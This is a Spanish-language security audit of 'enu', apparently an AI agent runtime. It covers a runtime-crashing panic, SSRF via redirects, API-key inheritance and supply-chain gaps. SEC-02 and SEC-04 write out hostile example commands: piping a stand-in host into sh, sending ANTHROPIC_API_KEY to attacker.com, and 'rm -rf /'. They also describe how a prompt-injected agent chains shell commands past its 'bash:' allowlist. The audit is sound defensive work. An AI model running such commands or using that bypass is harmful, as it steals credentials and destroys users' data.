# Auditoría de seguridad — 16 de julio de 2026

Auditoría de seguridad del proyecto `enu` centrada en las dimensiones donde un
runtime que ejecuta código arbitrario y custodia claves de proveedores puede
comprometerse: **permisos** del agente, **aislamiento** de workers, primitivas
de **fs/proc/http**, manejo de **secretos**, robustez de los **hooks/HostFn**,
y **cadena de suministro** (releases y dependencias). Cubre tanto los contratos
de `docs/` como el kernel Go (`internal/runtime`, `internal/vmwasm`), las
extensiones Lua embebidas y el pipeline de release.

**Metodología.** Auditores independientes por dimensión (permisos, aislamiento,
fs-proc-http, secretos, hooks, suministro), cada uno con el modelo ajustado a la
complejidad de su superficie. Cada defecto candidato pasó por **verificación
adversarial doble**: dos verificadores independientes, instruidos para
*refutar* el hallazgo leyendo el código y la espec (varios escribieron tests de
reproducción empírica). Solo se retienen los hallazgos que **sobreviven a ambos
pases**; cuando los verificadores discreparon en severidad, este informe
adopta la lectura más conservadora y **deja constancia explícita del ajuste**.
Dos candidatos cayeron en la refutación y se anotan en el apéndice A.

Los ítems llevan id `SEC-##`, ordenados por severidad. Severidad: 🔴 alta,
🟡 media, 🔵 baja.

**Veredicto global.** El proyecto está en **fase de diseño/construcción
temprana** (pre-1.0, un solo mantenedor, sin release estable), y su postura de
seguridad es **coherente con esa fase pero con cuatro grietas de diseño que
conviene cerrar antes de congelar la superficie sagrada**, más un bug de
robustez de kernel que rompe una invariante central del proyecto. Lo positivo:
el modelo de permisos es *deny-by-default* con allowlist explícito (no un
blocklist ingenuo), la capa dura de workers-con-`caps` está bien concebida, y
la mayoría de superficies delicadas ya pasaron por el flujo canónico `G##`. Lo
que esta auditoría destapa es que **dos de las defensas anunciadas no son
fronteras reales tal como están especificadas** (el patrón `bash:` de
allow/deny y la protección de la API key frente a subprocesos), que **el
aislamiento por task de ADR-008 tiene un agujero implementado** (un panic de
HostFn tumba todo el runtime; un worker alcanza memoria del hilo principal), y
que **la cadena de suministro carece de firma/atestación**. Ninguno es una
vulnerabilidad explotable *en producción hoy* porque no hay producción; todos
son exactamente el tipo de decisión que debe tomarse *ahora*, en diseño, y no
tras el congelamiento.

---

## 1. Hallazgos

### 🔴 SEC-01 — Un panic de Go en una HostFn escapa sin `recover` y tumba todo el runtime (bypass del aislamiento por task de ADR-008)

**Superficie.** `internal/vmwasm/scheduler.go:168` y `:321`;
`internal/vmwasm/host.go:96` y `:343`; `internal/runtime/vmwasm_fs.go:47`.

**Descripción.** El contrato de robustez del proyecto —«robustez por watchdog +
`pcall` en cada frontera de hook» (ADR-008); agente.md §4: «el cuerpo del turno
corre bajo `pcall`, así que un error nunca mata la task en silencio»— protege
**solo los errores lanzados en Lua**. La invocación de las primitivas Go
(HostFn) **no está cubierta por ningún `recover`**: ni en el camino síncrono
`dispatchPrimitive` (`host.go:96`, `rets, callErr := reg.fns[id](inst,
decoded)`), ni en el asíncrono `performHostcall`, que corre dentro de una
**goroutine de fondo desnuda** lanzada en `scheduler.go:168` (`go
inst.performRequest(...)`) y ejecuta en `scheduler.go:321` `rets, callErr :=
reg.fns[id](inst, args)`. Un `grep -rn "recover()"` sobre **todo** el código Go
del repo devuelve **vacío** (verificado). A la vez, varias primitivas indexan
sus args directamente sin comprobar aridad —`vmwasm_fs.go:47`, `path, _ :=
args[0].(string)`— pese a que el propio fichero define helpers acotados
(`arg`/`argString`, `vmwasm_fs.go:196-206`) que devuelven `nil` ante índice
fuera de rango. El thunk Lua genérico reenvía `...` sin validar aridad
(`host.go:343`, `args = { ... }`). Por tanto `nu.fs.read()` sin argumentos
produce un `args` vacío; `args[0]` lanza un panic de Go **dentro de la goroutine
de fondo**, fuera de cualquier `Call` de wazero y de cualquier `pcall` de Lua;
y un panic no recuperado en otra goroutine **aborta el proceso entero**.

**Impacto.** Cualquier código Lua **no privilegiado** (un plugin de terceros, el
handler de una tool del agente, un comando slash, o código Lua generado por el
modelo) que llame a una primitiva ⏸ con aridad o tipos incorrectos —p. ej.
`nu.fs.read()`— mata el proceso completo: todas las tasks, todas las sesiones
concurrentes y todos los workers. Es un **DoS trivial de disparar y de un solo
tiro**, y contradice directamente el aislamiento por task de ADR-008 y la
invariante de CLAUDE.md de que «un plugin que hace `error` no debe tumbar el
core». En un coding harness que procesa salidas de tools y de modelo
influenciables por un atacante (prompt injection), un argumento malformado que
alcance una HostFr frágil es un apagón del runtime. Ambos verificadores
confirmaron severidad **alta**; uno lo reprodujo end-to-end (`panic: runtime
error: index out of range [0] with length 0`, con `pcall` de Lua envolviendo la
llamada, sin capturar nada).

**Recomendación.** Es un **bug de implementación del kernel** (no de espec), y
la corrección debe ir por dos vías complementarias: (1) armar un `defer
recover()` en la frontera de invocación de toda HostFn —tanto en
`dispatchPrimitive` como en `performHostcall`— que traduzca el panic a un error
estructurado `EINTERNAL`/`EINVAL` propagable a Lua vía el mecanismo de error
existente, cerrando el bypass del aislamiento con independencia de qué primitiva
sea frágil; y (2) migrar las primitivas que aún indexan `args[N]` directo al
helper acotado `arg(args, N)` que el propio código define (patrón repetido en
`vmwasm_fs.go:47,57,77,94,112,126,135`, `vmwasm_re.go`, `vmwasm_plugin.go` y
`vmwasm_codecs.go:127`). *Pertenece a otro workflow de código Go; aquí queda
como recomendación priorizada.*

---

### 🔴 SEC-02 — El allow/deny sobre `bash:` es una frontera falsa: glob sobre string de shell, bypass por encadenamiento y allow que concede ejecución arbitraria

**Superficie.** `docs/agente.md:206-207` (patrones allow/deny), `docs/agente.md:229-231`
(razón: defensa headless ante prompt injection), `docs/agente.md:346-347` (las
`caps` no restringen tools). *Diseño.*

**Descripción.** Los permisos son patrones `tool[:argumento]`
(`allow={'bash:git *'}`, `deny={'bash:rm *'}`), pero **ningún documento**
(`agente.md`, `chat.md`, `api.md`, `guia-plugins.md`) especifica el **algoritmo
de emparejamiento** de esos patrones (verificado por búsqueda). Con la semántica
glob que todos los ejemplos implican (prefijo + `*`), y sabiendo que la tool
`bash` interpreta un string de shell (`sh`, cf. `problemas.md`), `*` casa
cualquier carácter, incluidos `;`, `&&`, `|`, `$()`:

- `allow='bash:git *'` **autoriza de facto `bash:*`**: el modelo emite
  `git status; curl evil|sh` y ejecuta comandos arbitrarios encadenando tras un
  `git` permitido. `bash:git *` ≡ `bash:*`.
- Simétricamente, `deny='bash:rm *'` **no muerde** `bash -c 'rm -rf /'`, `find .
  -delete`, `/bin/rm`, ni `cd x && rm`: el denylist se evade reescribiendo el
  comando.

La spec presenta este allowlist como la **protección auditable** del contexto
headless/CI, «exactamente el contexto sin supervisión y el más expuesto a
prompt injection» (agente.md:229-231). Para el agente por defecto (no-worker) es
la única valla model-facing: §9 (agente.md:346-347) confirma que las `caps`
limitan el código Lua del subagente, **no las tools**, cuyos handlers corren en
el estado principal vía proxy. Un subagente en worker sin cap `proc` igualmente
invoca la tool `bash`, cuyo handler corre en el principal con `proc`.

**Impacto.** Un modelo con prompt injection en CI headless con un allowlist
razonable (`allow=['bash:git *']`) ejecuta comandos arbitrarios encadenando; los
`deny` de comandos peligrosos se evaden. La defensa anunciada contra prompt
injection **no es una frontera real para la tool `bash`**, y la auditabilidad
prometida («auditable de un vistazo») queda socavada porque un allowlist de
prefijo no acota lo que parece acotar.

*Ajuste de severidad.* Los verificadores discreparon: uno mantuvo **alta**
(ejecución arbitraria vía prompt injection con allowlist razonable; la fase de
diseño es justo el momento de cerrarlo), otro ajustó a **media** por cuatro
mitigantes reales: (1) la spec rotula allow/deny como «capa *blanda* (frente al
modelo)» y nombra la capa *dura* (workers con `caps`); (2) el denylist ya lo
desautoriza el propio proyecto como «seguridad falsa» (G16); (3) los hooks
`permission`/`tool.pre` permiten construir un parser propio que vete; (4) es
fase de diseño, sin vuln en producción. Este informe lo mantiene en **🔴 alta**
por conservadurismo en seguridad: para el agente por defecto (no-worker) es la
única valla operativa del `bash`, y la protección se *anuncia* como la defensa
del contexto más expuesto.

**Recomendación.** Hallazgo de **diseño** → flujo canónico `G##` (ver §3,
propuesta **G53**). La resolución debe (a) **especificar el algoritmo de
emparejamiento** de `tool[:argumento]` en `api.md`/`agente.md`, y (b) **decidir
la política de encadenamiento** para la tool `bash`: o el patrón se aplica al
*programa* invocado tras un parseo real del comando (no un glob sobre el string
crudo), o la spec advierte explícitamente que `bash:` no es una frontera y
remite a los hooks / al worker sin `proc` / a `opts.tools` como la valla dura.

---

### 🔴 SEC-03 — `nu.http`/`nu.http.stream` siguen redirects sin control y reenvían cabeceras de credenciales (`x-api-key`, `x-goog-api-key`) a otro host

**Superficie.** `internal/runtime/http.go:180`, `internal/runtime/http.go:253-262`,
`internal/runtime/stream.go:367`, `docs/api.md:207`. *Diseño (corolario de
completitud).*

**Descripción.** El cliente HTTP se construye **sin `CheckRedirect`** (ni en
`reusableClient` ni en `customClient` ni en el `clientFor` de `openStream`), por
lo que `client.Do(req)` aplica la política por defecto de Go: seguir hasta 10
redirects automáticamente. El contrato de `api.md` §8 **no expone ninguna opción
`redirect`/`max_redirects`/`follow`** para desactivarlo ni para observar la
cadena —la lista de `opts` es `url, method?, headers?, body?, timeout_ms?, tls?,
proxy?`—. Go solo depura `Authorization`/`Cookie`/`WWW-Authenticate` al redirigir
a otro dominio; las cabeceras **personalizadas** de las que dependen dos
adaptadores oficiales —`x-api-key` (Anthropic, `adapter_anthropic.lua:265`) y
`x-goog-api-key` (Gemini, `adapter_gemini.lua:281`)— **no se depuran** y viajan a
cualquier host de destino del redirect. Es un caso de corolario de completitud:
un adaptador de provider consciente de la seguridad **no puede** optar por no
seguir redirects porque la API no lo permite, y el redirect se resuelve dentro
de `client.Do` antes de volver a Lua, así que ningún adaptador puede
interceptarlo componiendo la API v1.

**Impacto.** El eje que sostiene la severidad es la **amplificación de SSRF**:
una validación de destino hecha en la capa de tool (un futuro fetcher que
compruebe la URL) se evade con un `302` a `169.254.169.254`, robando
credenciales de metadata en un harness que hace fetch de URLs no confiables.
Secundariamente, un provider honesto que redirija hacia un tercero, o un
`base_url` sobre `http://` plano (el Ollama de providers.md:42) o con
`tls.insecure=true`, filtra la cabecera con la API key al host de destino.

*Ajuste de severidad — hallazgo contestado.* Un verificador mantuvo **alta**; el
otro **refutó** el eje de *robo de credencial vía redirect* con un argumento
correcto: en los cuatro escenarios de exfiltración enumerados, el atacante que
puede inyectar el `302` **ya recibió la credencial en la petición inicial** (el
primer host lee las cabeceras completas antes de responder), luego el redirect
no añade una fuga nueva de la clave. Lo que **sobrevive** de forma robusta es:
(1) el **open-redirect hacia un tercero honesto-pero-redirigido** (fuga genuina
de la clave a un host que no la tenía) y, sobre todo, (2) la **amplificación de
SSRF** independiente de credenciales. Este informe lo mantiene en **🔴 alta** por
el eje SSRF —no mitigable con la API v1— pero **acota el modelo de amenaza**: el
titular no es «todo redirect roba tu `x-api-key`», sino «no hay forma de
desactivar ni observar el seguimiento de redirects, lo que amplifica cualquier
validación de destino y abre un open-redirect de credenciales en el caso
honesto».

**Recomendación.** Hallazgo de **diseño** → `G##` (propuesta **G54**). Añadir
por adición a `api.md` §8 una opción de control de redirect (`redirect =
"follow"|"error"|"manual"` y/o `max_redirects`), de modo que un adaptador o un
tool de fetch puedan optar por no seguirlos o inspeccionar la cadena. Considerar
además, como default seguro, depurar cabeceras sensibles conocidas en redirects
cross-host. *La implementación en Go pertenece a otro workflow.*

---

### 🟡 SEC-04 — La API key del provider se hereda por defecto en todo subproceso que lanza el agente

**Superficie.** `internal/runtime/proc.go:212-216`;
`internal/runtime/embedded/providers/lua/providers/init.lua:270-272`;
`docs/api.md` §6. *Diseño.*

**Descripción.** La clave del LLM se lee del entorno del proceso `nu`
(`api_key = nu.sys.env(prov.api_key_env)`; providers.md §1: «nunca la clave en
el fichero, vive en el entorno»), luego está garantizadamente en `os.Environ()`.
`mergedEnv` (`proc.go:212-216`) devuelve `nil` —«hereda `os.Environ()` sin
cambios»— cuando `nu.proc.run`/`spawn` no reciben `opts.env` ni overlay. El
contrato de `nu.proc` (`api.md` §6) documenta `env` como control total pero
**no especifica en ningún sitio que los secretos del provider deban recortarse
del entorno heredado**; ni `api.md`, ni `agente.md`, ni `providers.md` mencionan
scrubbing/redacción de credenciales hacia subprocesos. (El único ítem cercano,
`P7` en `pospuesto.md`, cubre la redacción en *transcripts*, no la herencia de
entorno.) El agente ejecuta comandos generados por el LLM (tool `bash`), todos
los cuales reciben `ANTHROPIC_API_KEY` en su entorno por defecto.

**Impacto.** Exfiltración de la clave del LLM por inyección de prompt: cualquier
comando que el agente ejecute (`env`, `curl attacker.com?k=$ANTHROPIC_API_KEY`,
un `npm run` con `postinstall` hostil) ve la credencial. El propio secreto que
paga las llamadas del agente es alcanzable por todo el código no confiable que
el agente corre.

*Ajuste de severidad.* Ambos verificadores confirmaron el vector y **ajustaron
de alta a media**, coincidiendo en los mitigantes: (1) es el comportamiento
estándar de todo CLI agéntico (la clave la exporta el usuario); (2) hay defensa
*parcial* por el modelo de permisos —default-deny para tools que mutan/red en
headless, y la capa dura del worker sin cap `proc`—; (3) el arreglo es a nivel
de contrato/extensión, no del kernel. Se corrige un matiz del hallazgo original:
las skills de `.nu/skills/` **no son código ejecutado** sino contenido markdown
inyectado como contexto tras la puerta TOFU (agente.md), no reciben la clave. El
riesgo residual real: un subproceso **explícitamente permitido** (`bash:npm *`
con `postinstall` hostil) hereda la credencial y nada la recorta. **🟡 media.**

**Recomendación.** Hallazgo de **diseño** → `G##` (propuesta **G55**).
Especificar en el contrato de la extensión `agent` (o en `nu.proc`) el
**scrubbing de los secretos del provider** del entorno que hereda la tool
`bash` por defecto —recortar las variables `api_key_env` conocidas salvo
opt-in explícito—, y documentar el patrón para plugins que lancen subprocesos.

---

### 🟡 SEC-05 — Un worker alcanza el estado Go del runtime principal (`rt.ownerStack`) a través de primitivas [W] con atribución de dueño → data race

**Superficie.** `internal/vmwasm/worker.go:199-206` y `:334`;
`internal/runtime/runtime.go:416-419`; `internal/runtime/vmwasm_log.go:24`;
`internal/runtime/vmwasm_loader.go:151-153`; `internal/runtime/proc.go:412`.
*Implementación.*

**Descripción.** `spawnWorker` **copia verbatim** los HostFn del pool padre al
registro del worker (`worker.go:201-206`, `wp.reg.register(name,
parent.fns[id], ...)`). Varios de esos HostFn son closures que capturan el
`*Runtime` **principal** y, al atribuir el dueño de la operación, leen
`rt.ownerStack` **sin candado**: `nu.log.*` (`vmwasm_log.go:24`,
`rt.currentOwner()`) y `nu.proc.spawn/run` (`proc.go:412`, `ownerName:
rt.currentOwner()`). Ambos módulos son [W] (concedidos por `workerGrants` por
defecto), así que cruzan al worker. El worker corre en su **propia goroutine**
(`go w.run`, `worker.go:334`) tomando el `mu` de *su* Instance —un mutex
distinto del de la instancia principal—, y ejecuta ese HostFn en línea.
`currentOwner()` (`runtime.go:416-419`) hace `len(rt.ownerStack)` + indexado
**sin lock**; mientras tanto el hilo principal muta esa misma slice con
`l.rt.ownerStack = append(...)` y `= ...[:len-1]` durante cada init/reload de
plugin (`vmwasm_loader.go:151-153`). Lectura y reasignación concurrentes de la
cabecera de slice desde dos goroutines, sin sincronización = **data race**,
precisamente la «ruta por la que un worker toca memoria del hilo principal» que
ADR-008 prohíbe («sin memoria compartida»). El comentario de la implementación
(`vmwasm_log.go:15`) afirma que el acceso es race-free «single-thread, sin
candado» — premisa que los workers, al correr en otra goroutine, **invalidan**.

**Impacto.** Un worker que hace `nu.log.info`/`nu.proc.spawn` en su bucle,
concurrente con un `nu.plugin.reload` o el arranque de una extensión en el hilo
principal, provoca un data race sobre `rt.ownerStack`: lectura desgarrada,
**panic por índice fuera de rango**, o dueño de log/proc corrupto. El race
detector lo marca; es comportamiento indefinido bajo el modelo de memoria de Go.
Ambos verificadores confirmaron **media**.

**Recomendación.** Bug de **implementación** (aunque su raíz es la decisión de
diseño de SEC-07). Serializar el acceso a `rt.ownerStack` (candado dedicado o
lectura atómica de un puntero inmutable), **o** —mejor, y ligado a SEC-07— dar
al worker una identidad de dueño **propia y fija** que no lea la pila del padre.
*Pertenece a otro workflow de código Go.*

---

### 🟡 SEC-06 — Las releases no llevan firma ni atestación de procedencia; el checksum viaja por el mismo canal que el binario

**Superficie.** `.github/workflows/release.yml:144,158-160`; `install.sh:4,156`;
`README.md:55`. *Infraestructura / cadena de suministro.*

**Descripción.** El pipeline de release genera únicamente un `checksums.txt` con
`sha256sum *.tar.gz` y lo sube a la **misma** GitHub Release que los tarballs.
`install.sh` descarga tarball y `checksums.txt` del mismo `BASE` y compara el
sha256. **No hay firma GPG, ni cosign/sigstore, ni atestación de procedencia
SLSA** (`actions/attest-build-provenance`): el workflow ni siquiera pide los
permisos `id-token: write` / `attestations: write`. Por tanto el checksum
garantiza **integridad de transporte, no autenticidad**: quien pueda alterar los
assets de la release (cuenta o token de GitHub comprometidos, infra de GitHub,
maintainer malicioso) regenera `checksums.txt` para que cuadre con un binario
troyanizado y la verificación pasa. Para un runtime que ejecuta código
arbitrario y custodia claves de proveedores, un binario suplantado es
compromiso total.

**Impacto.** Un atacante con capacidad de modificar los assets de una GitHub
Release sustituye el binario y su checksum a la vez; todo `curl|sh` posterior
instala el binario troyanizado sin que la verificación de integridad lo detecte.
No existe mecanismo criptográfico que ate el artefacto al repositorio/tag.

*Ajuste de severidad.* El núcleo técnico es cierto y no mitigable con la API de
`enu`, pero **ambos verificadores ajustaron de media a baja** por tres motivos
verificados: (1) es una **decisión consciente y documentada con disparador de
reapertura** —ADR-013 marca el pipeline como DevOps del operador fuera de la
superficie sagrada y lista «firmar binarios (cosign/GPG)» como mejora futura que
reabriría el punto 5—; (2) la acusación de «sobrevender autenticidad» es
**infundada**: `install.sh:4` y `README.md:55` dicen «verifica el checksum
sha256» / «verifica la integridad» —exactamente lo que hacen—, sin prometer
autenticidad ni firma; (3) el modelo de amenaza exige un atacante muy
privilegiado que también controla el workflow y la identidad OIDC, contra el
cual una atestación emitida en ese mismo CI **no protege** (una cuenta
comprometida emite procedencia SLSA válida sobre el binario troyanizado). El
proyecto es pre-1.0, de un solo desarrollador, aún sin release estable. Este
informe lo deja en **🟡 media** en la tabla por prudencia sobre la superficie de
suministro, **anotando que ambos auditores lo sitúan en baja**; el disparador
de ADR-013 ya cubre su reapertura.

**Recomendación.** Endurecimiento legítimo cuando se corte la primera estable:
añadir atestación de procedencia SLSA (`attest-build-provenance`, con
`id-token`/`attestations`) **y verificación en `install.sh`** (`gh attestation
verify` o cosign keyless), que es lo que da valor real frente a la manipulación
de assets. *Pertenece a otro workflow (infra); no se toca `release.yml`,
`install.sh` ni `README.md` desde aquí.*

---

### 🔵 SEC-07 — El contrato [W] no define qué identidad/dueño porta un worker; las primitivas atribuidas por owner tuvieron que leer el estado del padre

**Superficie.** `docs/api.md` §16 (marca [W]); `internal/runtime/vmwasm_log.go:9-15`;
`internal/runtime/proc.go:404-417`. *Diseño.*

**Descripción.** Un worker es un mini-runtime **sin ciclo de vida de plugins**
(no tiene `nu.plugin`; su `ownerStack` es intrínsecamente vacío). Pero las
primitivas [W] atribuidas a un dueño (`nu.log`; `nu.proc` vía su registro por
owner para reload) **necesitan** un `owner` string. El contrato (`api.md` §16 se
limita a marcar [W]; §13 solo niega `nu.plugin` al worker; `agente.md`,
`providers.md` no lo cubren) **nunca especifica cuál es la identidad de un
worker** a efectos de log/tracking. Al faltar esa decisión de diseño, la
implementación resolvió **leyendo el `rt.ownerStack` del padre** —que en el
instante del cruce vale lo que el hilo principal esté haciendo (nondeterminista)
e introduce además el data race de SEC-05—. Este hallazgo es la **raíz de
diseño** de SEC-05: el bug de concurrencia existe porque el contrato no dice
bajo qué identidad corre un worker.

**Impacto.** Las líneas de log emitidas por un worker se atribuyen a un dueño
arbitrario (el tope de la pila del padre en ese momento), y sus procesos se
registran bajo ese dueño en `rt.sched` —de modo que un `reload` del plugin
equivocado en el hilo principal puede **matar procesos que en realidad lanzó un
worker** (`proc.go` `releaseOwnerHandles`)—. Trazabilidad y ciclo de vida de
recursos incorrectos, sin forma de expresar «esto lo hizo tal worker». Ambos
verificadores confirmaron **baja**, acotando el impacto: en régimen estable
post-boot la pila del padre suele estar vacía (worker → `"user"`, determinista)
y el escenario reload-mata-proc exige spawnear durante un `init.lua` (ventana
estrecha); pero la brecha de **trazabilidad** es permanente.

**Recomendación.** Hallazgo de **diseño** → `G##` (propuesta **G56**, que
*resuelve la raíz común de SEC-05*). Decidir la identidad del worker en el
contrato: un owner fijo (`"worker"` o el nombre del módulo del worker), o negar
la atribución-por-dueño de `log`/`proc` en workers. La resolución elimina de
paso el data race de SEC-05 (el worker deja de leer la pila del padre).

---

### 🔵 SEC-08 — Dependencia `goldmark v1.7.8` fijada con CVE conocido (GO-2026-5320, XSS), corregido en v1.7.17

**Superficie.** `go.mod:15`, `go.sum`. *Cadena de suministro / higiene de
dependencias.*

**Descripción.** `go.mod` fija `github.com/yuin/goldmark v1.7.8`. `govulncheck`
(base de datos oficial, ejecutado en este arranque) reporta **GO-2026-5320**
(Cross-site Scripting en goldmark), presente en v1.7.8 y **corregido en
v1.7.17**. Es deuda de cadena de suministro fácil de saldar con un `go get
github.com/yuin/goldmark@v1.7.17`.

**Impacto.** *Riesgo de seguridad efectivo prácticamente nulo por construcción.*
Ambos verificadores confirmaron el hecho (v1.7.8 fijada, existe fix) pero
**refutaron el impacto de seguridad**: `enu` importa solo `goldmark`,
`goldmark/ast` y `goldmark/text`, y su único uso
(`internal/runtime/markdown.go:147`) es `goldmark.DefaultParser().Parse(...)`
—goldmark como **parser de AST CommonMark puro**, que renderiza a un `Block` de
spans **de terminal** con un renderer propio—. Nunca importa
`goldmark/renderer/html`, nunca llama a `goldmark.New()` ni a `.Convert()`, que
es el camino markdown→HTML donde vive todo XSS de goldmark. El símbolo
vulnerable **no se enlaza** en el binario, y `govulncheck` confirma la
no-alcanzabilidad («your code doesn't appear to call these vulnerabilities»). El
escenario «si en el futuro se emite HTML» contradice el propósito documentado de
`nu.text.markdown` (S23: renderizar a terminal). Queda como **higiene de
dependencias**, en **🔵 baja**.

**Recomendación.** Actualizar `goldmark` a `v1.7.17` como mantenimiento
rutinario de cadena de suministro. *Toca `go.mod`/`go.sum`: pertenece a otro
workflow; aquí queda como recomendación.*

---

## 2. Sobre los arreglos triviales

Esta auditoría **no aplicó ningún arreglo** en el worktree. La razón es
estructural: **los ocho hallazgos caen fuera de la superficie de arreglo trivial
permitida** (typos y notas de doc en `docs/` que no cambien semántica de API).

- SEC-01 y SEC-05 son **bugs de código Go** (`internal/vmwasm`,
  `internal/runtime`) → otro workflow.
- SEC-02, SEC-03, SEC-04 y SEC-07 son **grietas de diseño**: cualquier «nota de
  doc» que las tocara (especificar el algoritmo de match, la política de
  redirect, el scrubbing de secretos o la identidad del worker) **cambiaría la
  semántica de la API/contrato**, que es precisamente lo que el flujo canónico
  `G##` reserva al propietario. Añadirlas por la vía de hecho violaría la regla
  de oro de CLAUDE.md («el código/doc nunca corrige la espec por la vía de
  hecho»). Van como propuestas de `G##` (§3).
- SEC-06 toca `release.yml`/`install.sh`/`README.md` y SEC-08 toca
  `go.mod`/`go.sum` → superficies explícitamente excluidas.

---

## 3. Enrutamiento al flujo canónico — propuestas `G##`

Los **cuatro hallazgos de diseño** (`es_diseno: true`) deben entrar en
`docs/problemas.md` por el flujo canónico. **No se ha editado `problemas.md`**:
lo que sigue son *propuestas* que el propietario aprobará y numerará (el
contador vivo está en la cabecera de `problemas.md`; el último asignado es G52,
con G42–G43 reservados, por lo que la primera libre es **G53**). Los cuatro
bugs no-diseño (SEC-01, SEC-05, SEC-06, SEC-08) **no** abren `G##`: son de
código/infra y pertenecen a sus workflows respectivos, aunque SEC-05 se cierra
naturalmente al resolver el G## de SEC-07.

- **G53 (de SEC-02) — Semántica de emparejamiento de los patrones de permiso
  `tool[:argumento]` y tratamiento del encadenamiento en `bash`.** Especificar en
  `api.md`/`agente.md` el algoritmo de match, y decidir si `bash:` empareja
  contra el string crudo (glob, no-frontera → advertir) o contra el programa
  parseado. Afecta a `agente.md` §5, `chat.md` §5 (ejemplos), `guia-plugins.md`.

- **G54 (de SEC-03) — Control de redirects en `nu.http`/`nu.http.stream`.**
  Añadir por adición a `api.md` §8 una opción `redirect`/`max_redirects` (y/o
  depuración de cabeceras sensibles cross-host por defecto), para que un
  adaptador pueda no seguir redirects u observar la cadena. Corolario de
  completitud: hoy no es expresable con la API v1. Incrementa `nu.version.api`.

- **G55 (de SEC-04) — Scrubbing de los secretos del provider en el entorno
  heredado por la tool `bash`.** Especificar en el contrato de la extensión
  `agent` (y/o en `nu.proc` §6) que las variables `api_key_env` conocidas se
  recortan del entorno de los subprocesos por defecto, salvo opt-in explícito.
  Distinto de `P7` (que cubre redacción en transcripts, no en entorno).

- **G56 (de SEC-07, resuelve la raíz de SEC-05) — Identidad/dueño de un worker
  para las primitivas [W] atribuidas por owner.** Decidir en `api.md`
  §13/§16 y `agente.md` bajo qué identidad corren `nu.log`/`nu.proc` en un
  worker (owner fijo `"worker"`/nombre de módulo, o negar la atribución). La
  resolución elimina la lectura de `rt.ownerStack` del padre y con ella el data
  race de SEC-05.

---

## 4. Tabla resumen

| ID | Severidad | Dimensión | Diseño | Título | Ruta |
|---|---|---|---|---|---|
| SEC-01 | 🔴 alta | hooks/HostFn | no | Panic de Go en HostFn tumba el runtime (bypass de ADR-008) | Código Go |
| SEC-02 | 🔴 alta¹ | permisos | sí | El allow/deny `bash:` es una frontera falsa (glob + encadenamiento) | **G53** |
| SEC-03 | 🔴 alta² | fs-proc-http | sí | Redirects HTTP sin control reenvían credenciales / amplifican SSRF | **G54** |
| SEC-04 | 🟡 media | secretos | sí | La API key se hereda por defecto en todo subproceso | **G55** |
| SEC-05 | 🟡 media | aislamiento | no | Worker alcanza `rt.ownerStack` del principal → data race | Código Go |
| SEC-06 | 🟡 media³ | suministro | no | Releases sin firma/atestación; checksum en el mismo canal | Infra (ADR-013) |
| SEC-07 | 🔵 baja | aislamiento | sí | El contrato [W] no define la identidad/dueño de un worker | **G56** |
| SEC-08 | 🔵 baja | suministro | no | `goldmark v1.7.8` con CVE conocido (no alcanzable) | `go.mod` |

¹ Un verificador ajustó a media (mitigantes: capa «blanda» declarada, G16,
hooks); se mantiene alta por conservadurismo — es la única valla del `bash` por
defecto y se *anuncia* como defensa del contexto más expuesto.
² Contestado: un verificador refutó el eje *robo de credencial vía redirect*
(el atacante ya ve la clave en la petición inicial); sobreviven el open-redirect
honesto y la **amplificación de SSRF**, no mitigable con la API v1.
³ Ambos verificadores lo sitúan en **baja** (decisión documentada con disparador
en ADR-013, sin sobreventa de autenticidad, atacante muy privilegiado); se deja
en media por prudencia sobre la superficie de suministro.

**Recuento:** 8 hallazgos confirmados (3 🔴 alta, 3 🟡 media, 2 🔵 baja) + 2
refutados (apéndice A). 4 de diseño → **G53–G56 propuestas**; 4 de código/infra
→ workflows respectivos.

---

## 5. Cierre

La postura de seguridad de `enu` es la esperable de un proyecto en diseño con un
esqueleto arquitectónico sólido: *deny-by-default*, allowlist explícito, capa
dura de workers-con-`caps`, y la mayoría de superficies delicadas ya pasadas por
el flujo `G##`. Lo que esta auditoría añade es que **tres defensas anunciadas no
son fronteras reales tal como están hoy** —el patrón `bash:` (SEC-02), la
herencia de la API key (SEC-04) y el aislamiento por task frente a un panic de
HostFn (SEC-01)— y que **el modelo «sin memoria compartida» de ADR-008 tiene un
agujero implementado** por una decisión de contrato que nunca se tomó (SEC-05 +
SEC-07). Ninguno es explotable en producción hoy porque no la hay; todos son
exactamente el tipo de decisión que el flujo del proyecto reserva a *ahora*.

**Prioridad recomendada.** (1) SEC-01 —blindar la frontera de HostFn con
`recover`— es el más barato y el que restaura una invariante central; va por
código, ya. (2) SEC-02 y SEC-03 son los `G##` más urgentes: hay promesa de espec
incumplida (auditabilidad del `bash`) y un hueco de completitud (control de
redirects) que no se puede tapar sin tocar `api.md`. (3) SEC-07 → G56 resuelve
de paso el data race de SEC-05. (4) SEC-04 → G55 es un endurecimiento de
contrato de bajo coste. (5) SEC-06 y SEC-08 son higiene de suministro para el
corte de la primera estable, ya cubiertos por sus disparadores/rutinas.

Las decisiones de diseño (SEC-02, SEC-03, SEC-04, SEC-07) **no se resuelven en
esta rama**: quedan como propuestas `G53–G56` para que el propietario las
numere y resuelva por el flujo canónico, aplicando la resolución a *todos* los
documentos afectados. Resolver diseño por la vía de hecho está prohibido por
CLAUDE.md, y esta auditoría lo respeta.

---

## Apéndice A — Candidatos refutados por la verificación adversarial

| Candidato | Por qué no sobrevivió como hallazgo de seguridad |
|---|---|
| Robo de `x-api-key` **vía redirect** como vector propio (parte de SEC-03) | El atacante que inyecta el `302` ya recibió la clave en la petición inicial; el redirect no añade fuga de credencial. Sobreviven el open-redirect honesto y la amplificación de SSRF (por eso SEC-03 se retiene, pero con el modelo de amenaza acotado). |
| GO-2026-5320 (goldmark) como **vulnerabilidad explotable** (impacto de SEC-08) | El XSS vive en la ruta markdown→HTML (`renderer/html`, `.Convert()`) que `enu` no usa: solo importa el parser de AST y renderiza a spans de terminal. Símbolo no alcanzable (confirmado por `govulncheck`). Sobrevive solo como higiene de dependencias. |
